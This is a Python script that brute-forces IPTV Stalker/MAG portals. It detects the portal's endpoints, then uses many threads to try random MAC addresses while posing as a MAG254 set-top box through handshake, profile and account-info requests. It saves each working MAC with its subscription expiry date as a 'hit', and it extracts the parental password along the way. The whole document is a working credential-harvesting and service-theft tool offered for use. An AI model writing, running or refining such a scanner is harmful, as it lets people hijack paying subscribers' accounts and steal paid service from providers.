# request cloudscraper

import os
import datetime
import random
import sys
import time
import re
import subprocess
import threading
import pathlib
import requests
import hashlib
import json
import socket
import logging
import platform
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings for requests
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Set default SSL ciphers for secure connections
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:"
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:"
    "TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:"
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
)

# Initialize HTTP session
try:
    import cloudscraper
    sesq = requests.Session()
    session = cloudscraper.create_scraper(sess=sesq)
except:
    session = requests.Session()
logging.captureWarnings(True)

# Initialize global variables
hit_count = 0
checks_per_minute = 0
seen_macs = set()  # For hit deduplication
base_uri = "/c/"
portal_endpoint = "c/portal.php"
server_url = ""
scan_attempts = 0
bot_count = 0
default_mac_prefix = '00:1A:79:'
use_stalker_c = True  # Control whether stalker portals append /c/
min_days = 0
lock = threading.Lock()

# Predefined MAC prefixes
mac_prefixes = [
    'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:',
    '04:D6:AA:', '11:33:01:', '00:1C:19:', '1A:00:6A:', '1A:00:FB:',
    '00:A1:79:', '00:1B:79:', '00:2A:01:'
]

# List of endpoints, prioritized by commonality
endpoints = [
    "c/portal.php",               # Most common MAG portal
    "portal.php",                 # Common fallback
    "server/load.php",            # Common for stalker portals
    "load.php",
    "bs.mag.portal.php",
    "portalcc.php",
    "magLoad.php",
    "portalstb/portal.php",
    "k/portal.php",
    "maglove/portal.php",
    "p/portal.php",
    "magaccess/portal.php",
    "portalmega.php",
    "magportal/portal.php",
    "powerfull/portal.php",
    "stb/portal.php",             # Additional STB variant
    "mag/portal.php",             # Direct MAG path
    "api/portal.php",             # API-based endpoint
    "cms/portal.php",             # CMS-integrated portal
    "iptv/portal.php",            # IPTV-specific
    "player_api.php",             # Common for player APIs (e.g., Xtream)
    "panel_api.php",              # Panel access API
    "get.php",                    # Generic data fetcher
    "mag_loader.php",             # MAG loader variant
    "portal/portal.php",          # Nested portal
    "auth.php",                   # Authentication endpoint
    "vip/portal.php",             # VIP or premium portal
]

paths = [
    "",          # Root
    "/c/",       # Common MAG portal path
    "/portalstb/",       # Portal STB
    "/k/",               # Comet
    "/maglove/",         # Maglove
    "/p/",               # Generic p
    "/magaccess/",       # Magaccess
    "/powerfull/",       # Powerfull
    "/server/",          # test
    "/stb/",             # STB base path
    "/mag/",             # MAG base
    "/api/",             # API directory
    "/iptv/",            # IPTV directory
    "/bs/",              # BS variant base
    "/mega/",            # Mega portal base
    "/load/",            # Load directory
    "/portal/"           # Generic portal path
]

# User-agent for requests
user_agent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"

# Headers for portal detection
detect_headers = {
    "User-Agent": user_agent,
    "Accept": "application/json,application/javascript,text/javascript,text/html,*/*",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "Keep-Alive",
}

def clean_portal(portal):
    """Clean the portal input by removing http://, https://, and preserving port."""
    portal = re.sub(r'^https?://', '', portal).rstrip('/')
    return portal

def test_endpoint(portal, endpoint, path=""):
    """Test if an endpoint is valid by sending a GET request."""
    url = f"http://{portal}{path}{endpoint}".rstrip('/')
    try:
        response = session.get(url, headers=detect_headers, timeout=10, verify=False, allow_redirects=True)
        final_url = response.url.lower()
        content_type = response.headers.get("Content-Type", "").lower()
        status_code = response.status_code
        text_snippet = response.text[:500].lower()  # Limit to first 500 chars

        # Stricter false positive filtering
        false_positive_patterns = [
            r'wp-login', r'wp-admin', r'cpanel', r'admin', r'login\.php',
            r'404 not found', r'forbidden', r'sign in to your account',
            r'username.*password', r'401 unauthorized'
        ]
        if any(re.search(pattern, text_snippet, re.IGNORECASE) for pattern in false_positive_patterns):
            return False, ""

        # Check for specific IPTV portal criteria
        portal_patterns = [
            r'"js_config"', r'"handshake"', r'"get_profile"', r'"token"', 
            r'"stalker_portal"', r'"mag"', r'"stb"', r'"account_info"'
        ]
        if status_code in (200, 301, 302, 403):  # Include 403 as some portals use it
            # Check for IPTV-related keywords with regex
            if any(re.search(pattern, text_snippet) for pattern in portal_patterns):
                return True, f"{path}{endpoint}".lstrip('/')
            # Check for relevant content types
            if any(ct in content_type for ct in ["json", "javascript", "text/html"]):
                # Validate JSON structure for JSON responses
                if "json" in content_type:
                    try:
                        json.loads(response.text)
                        return True, f"{path}{endpoint}".lstrip('/')
                    except json.JSONDecodeError:
                        return False, ""
                return True, f"{path}{endpoint}".lstrip('/')
            # Check URL for portal indicators
            if any(keyword in final_url for keyword in ["portal", "stalker", "mag", "stb"]):
                return True, f"{path}{endpoint}".lstrip('/')
            # Fallback: non-empty response with plausible size and portal-like structure
            if len(response.text) > 0 and len(response.text) < 100000:
                if any(re.search(pattern, text_snippet) for pattern in portal_patterns):
                    return True, f"{path}{endpoint}".lstrip('/')
    except requests.RequestException:
        pass
    return False, ""

def detect_endpoints(portal):
    """Detect valid endpoints for the given portal using ThreadPoolExecutor."""
    found_endpoints = set()  # Use set for deduplication
    print("Portal detection in process...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_endpoint, portal, endpoint, path) 
                   for endpoint in endpoints for path in paths]
        for future in futures:
            result, endpoint = future.result()
            if result and endpoint:
                found_endpoints.add(endpoint)
    # Explicitly check c/portal.php
    result, endpoint = test_endpoint(portal, "portal.php", "/c/")
    if result and endpoint:
        found_endpoints.add(endpoint)
    return sorted(list(found_endpoints))  # Convert back to sorted list for consistent output

# Get user input and detect portal types
def get_user_input():
    global server_url, scan_attempts, bot_count, default_mac_prefix, portal_endpoint, base_uri, min_days
    server_url = input("Enter portal URL: ")
    server_url = re.sub(r'^https?://', '', server_url).rstrip('/')

    while True:
        try:
            scan_attempts = int(input("Number of scan attempts: "))
            if scan_attempts > 0:
                break
            print("Please enter a positive number.")
        except ValueError:
            print("Please enter a valid number.")

    while True:
        try:
            bot_count = int(input("Number of bots: "))
            if bot_count > 0:
                break
            print("Please enter a positive number.")
        except ValueError:
            print("Please enter a valid number.")

    # Prompt for MAC prefix
    mac_prefix_input = input("Enter MAC prefix [default: 00:1A:79]: ")
    if mac_prefix_input.strip():
        if re.match(r'^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}$', mac_prefix_input, re.IGNORECASE):
            default_mac_prefix = mac_prefix_input.upper() + ':'
        else:
            print("Invalid MAC prefix format. Using default")

    # Prompt for minimum days
    min_days_input = input("Minimum days to save hit [default: 0]: ").strip()
    if min_days_input:
        try:
            min_days = int(min_days_input)
        except ValueError:
            print("Invalid number. Using default.")
    # Else default is 0

    # Detect portal types
    found_endpoints = detect_endpoints(server_url)
    if not found_endpoints:
        print("No portal types detected. Defaulting to c/portal.php.")
        portal_endpoint = "c/portal.php"
        base_uri = "/c/"
        return  # Exit function after setting default

    # Display detected portal types
    print("\nDetected Portal Types:")
    for i, endpoint in enumerate(found_endpoints, 1):
        print(f"  Portal Type {i}: {endpoint}")

    # Prompt for portal type selection
    selected_portal = None
    while selected_portal is None:
        try:
            choice = input("\nSelect portal type number [default: c/portal.php]: ").strip()
            if choice == "":
                selected_portal = "c/portal.php"  # Default to c/portal.php
                portal_endpoint = "c/portal.php"
                base_uri = "/c/"
                break
            else:
                choice = int(choice)
                if 1 <= choice <= len(found_endpoints):
                    selected_portal = found_endpoints[choice - 1]
                else:
                    print(f"Please enter a number between 1 and {len(found_endpoints)}.")
        except ValueError:
            print("Please enter a valid number.")
        sys.stdout.flush()  # Ensure prompt is displayed
        time.sleep(0.1)  # Brief pause to prevent input race conditions

    # Set base_uri and portal_endpoint based on selection
    if selected_portal.startswith("c/"):
        base_uri = "/c/"
        portal_endpoint = selected_portal
    else:
        # Extract path prefix (e.g., /maglove/) without /c/
        path_prefix = '/'.join(selected_portal.split('/')[:-1]) + '/'
        base_uri = f"/{path_prefix.lstrip('/')}" if path_prefix != '/' else "/c/"
        portal_endpoint = selected_portal

# Check if server is reachable
def ping_server(server_url):
    try:
        test_url = f"http://{server_url.rstrip('/')}{base_uri}"
        response = session.get(test_url, timeout=5, verify=False)
        if response.status_code < 500:
            return True
    except requests.RequestException:
        pass

    try:
        hostname = re.sub(r'^https?://', '', server_url).split(':')[0].split('/')[0]
        param = '-n' if os.name == 'nt' else '-c'
        result = subprocess.run(
            ['ping', param, '1', '-w', '5000', hostname],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=5
        )
        return result.returncode == 0
    except (subprocess.TimeoutExpired, subprocess.SubprocessError):
        return False

# Convert month abbreviation to number
def month_string_to_number(month):
    months = {
        'jan': 1, 'feb': 2, 'mar': 3, 'apr': 4, 'may': 5, 'jun': 6,
        'jul': 7, 'aug': 8, 'sep': 9, 'oct': 10, 'nov': 11, 'dec': 12
    }
    month_short = month.strip()[:3].lower()
    try:
        return months[month_short]
    except:
        raise ValueError('Invalid month')

# Parse expiration date to calculate days remaining
def parse_expiration_date(date_str):
    try:
        month = str(date_str.split(' ')[0])
        day = str(date_str.split(', ')[0].split(' ')[1])
        year = str(date_str.split(', ')[1])
        month_num = str(month_string_to_number(month))
        date_obj = datetime.date(int(year), int(month_num), int(day))
        timestamp = time.mktime(date_obj.timetuple())
        return int((timestamp - time.time()) / 86400)
    except:
        return None

# Generate random MAC address
def generate_mac(prefix=default_mac_prefix):
    try:
        mac = f"{prefix}%02X:%02X:%02X" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        mac = mac.replace(':100', ':10')
        return mac
    except:
        return f"{prefix}00:00:00"

# Define request headers for handshake
def hea1(macs):
    HEADERA = {
        "User-Agent": user_agent,
        "Referer": f"http://{server_url}{base_uri}",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
    }
    return HEADERA

# Define request headers for authenticated requests
def hea2(macs, token):
    HEADERd = {
        "User-Agent": user_agent,
        "Referer": f"http://{server_url}{base_uri}",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Authorization": f"Bearer {token}",
    }
    return HEADERd

# Format hit output and check for expiration
def format_hit(mac_address, expiration_date):
    global hit_count
    try:
        with lock:
            if mac_address in seen_macs:
                return
            seen_macs.add(mac_address)

            hit_data = f"""
Date: {time.strftime('%d-%m-%Y %H:%M:%S')}
Panel: http://{server_url}{base_uri}
Mac: {mac_address}
Valid until: {expiration_date}
------
"""
            print(hit_data)
            with open(output_file, 'a+', encoding='utf-8') as file:
                file.write(hit_data + '\n')
            hit_count += 1
    except:
        pass

# Display scan status
def display_status(mac_address, bot_id, total_scans, hits_found, progress):
    global checks_per_minute, hit_count
    try:
        time_elapsed = time.time() - checks_per_minute
        cpm_value = round(60 / time_elapsed) if time_elapsed > 0 else 0
        checks_per_minute = time.time()
        status = f"""
Portal: {server_url}
Run: {total_scans}
Progress: {progress} %
Hits: {hit_count}
"""
        print("\033[H\033[J", end="")
        print(status)
    except:
        pass

# Main scanning function for each bot
def scan_bot(bot_number):
    global hit_count, checks_per_minute
    for scan in range(bot_number, scan_attempts, bot_count):
        total_scans = scan
        mac_address = generate_mac()
        encoded_mac = mac_address.upper().replace(':', '%3A')
        bot_id = f"Bot_{bot_number:02d}"
        progress = round((total_scans / scan_attempts) * 100, 2)
        display_status(mac_address, bot_id, total_scans, hit_count, progress)

        # Define API URLs
        handshake_url = f"http://{server_url}/{portal_endpoint}?type=stb&action=handshake&token&prehash&JsHttpRequest=1-xml"
        profile_url = f"http://{server_url}/{portal_endpoint}?action=get_profile&type=stb&sn=&device_id=&device_id2="
        account_info_url = f"http://{server_url}/{portal_endpoint}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"

        retries = 0
        # Handshake request
        while True:
            try:
                response = session.get(handshake_url, headers=hea1(encoded_mac), timeout=15, verify=False)
                data = str(response.text)
                break
            except:
                retries += 1
                time.sleep(1)
                if retries == 6:
                    break

        if 'token' in data:
            token = data.replace('{"js":{"token":"', '').split('"')[0]
            retries = 0
            # Get profile
            while True:
                try:
                    response = session.get(profile_url, headers=hea2(encoded_mac, token), timeout=15, verify=False)
                    data = str(response.text)
                    parental_password = data.split('parent_password":"')[1].split('","bright')[0]
                    break
                except:
                    retries += 1
                    time.sleep(1)
                    if retries == 6:
                        break

            account_id = "null"
            try:
                account_id = data.split('{"js":{"id":')[1].split(',"name')[0]
            except:
                pass

            if account_id != "null":
                retries = 0
                # Get account info
                while True:
                    try:
                        response = session.get(account_info_url, headers=hea2(encoded_mac, token), timeout=15, verify=False)
                        data = str(response.text)
                        break
                    except:
                        retries += 1
                        time.sleep(1)
                        if retries == 6:
                            break

                if data.count('phone') != 0:
                    raw_expiration = ""
                    if 'end_date' in data:
                        raw_expiration = data.split('end_date":"')[1].split('"')[0]
                    else:
                        try:
                            raw_expiration = data.split('phone":"')[1].split('"')[0]
                        except:
                            pass

                    if raw_expiration:
                        # Remove time indication (e.g., '11:59 am')
                        raw_expiration = re.sub(r'\d{1,2}:\d{2}\s*(?:AM|PM|am|pm)', '', raw_expiration, flags=re.IGNORECASE).strip()

                        expiration_date = raw_expiration
                        days = None
                        if raw_expiration.lower().startswith('un'):
                            days = float('inf')
                            expiration_date = "Unlimited"
                        else:
                            # Try parse as Month day, year
                            days = parse_expiration_date(raw_expiration)
                            if days is not None:
                                expiration_date = f"{raw_expiration} ({days} Days)"
                            else:
                                # Try YYYY-MM-DD
                                try:
                                    date_obj = datetime.datetime.strptime(raw_expiration, '%Y-%m-%d')
                                    days = (date_obj - datetime.datetime.now()).days
                                    expiration_date = f"{raw_expiration} ({days} Days)"
                                except:
                                    pass

                        if days is not None:
                            if days < min_days:
                                print(f"Skipping hit with less than {min_days} days: {mac_address} ({expiration_date})")
                                continue
                        format_hit(mac_address, expiration_date)

# Main execution
if __name__ == "__main__":
    get_user_input()

    # Ping server before proceeding
    if not ping_server(server_url):
        print("The server seems to be down. Try another one.")
        sys.exit(1)

    # Set up output file path
    from pathlib import Path

    if platform.system() == 'Linux' and Path('/storage/emulated/0').exists():
        output_dir = Path("/storage/emulated/0/Download/")
    else:
        home = Path.home()
        output_dir = home / "Downloads"

    output_dir.mkdir(parents=True, exist_ok=True)

    sanitized_url = server_url.replace(":", "_").replace('/', '')
    output_file = str(output_dir / f"{sanitized_url}_SimpleIptv_{time.strftime('%d-%m-%Y')}.txt")

    # Start scanning bots
    try:
        threads = []
        for i in range(1, bot_count + 1):
            t = threading.Thread(target=scan_bot, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("Shutting down gracefully...")
    finally:
        session.close()
